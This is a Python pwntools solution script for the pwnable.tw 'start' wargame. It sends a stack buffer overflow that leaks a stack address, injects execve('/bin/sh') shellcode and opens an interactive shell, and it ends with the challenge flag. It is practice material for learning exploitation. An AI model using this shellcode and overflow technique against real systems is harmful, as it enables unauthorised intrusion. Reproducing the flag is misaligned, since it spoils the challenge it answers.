from pwn import *

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

'''
This wargame is a lot more challenging, and therefore a lot more fun than what I've done before,
mostly OverTheWire.

One of the main differences is that the exploit is ran through a "raw" TCP socket, and not an SSH connection.
What it means is that, you cannot know the environment of the remote server,
and because of that you cannot predict where your shellcode lays in memory.

Though that doesn't matter since I now know that this wargame uses ASLR, so knowing so wouldn't help because
the stack's address space is changed on each run.

I much appreciate how this challenge makes you truly think creatively and not stick to known tricks
and doing the same thing over and over again, which is quite what I felt doing OverTheWire.
'''

r = remote('chall.pwnable.tw', 10000)

# Clear stdout buffer.
r.read()

# Overwrite return address with the subroutine that prints the stack.
r.write(b'A' * 20 + b'\x87\x80\x04\x08')

# Retrieve the shellcode's future address.
shellcode_addr = int.from_bytes(r.read()[:4], 'little') + 0x14
print(f'Shellcode address: {hex(shellcode_addr)}')

# Insert the shellcode along with its address.
r.write(b'A' * 20 + int.to_bytes(shellcode_addr, 4, 'little') + shellcode)

# Spawn shell.
r.interactive()

# Flag: FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
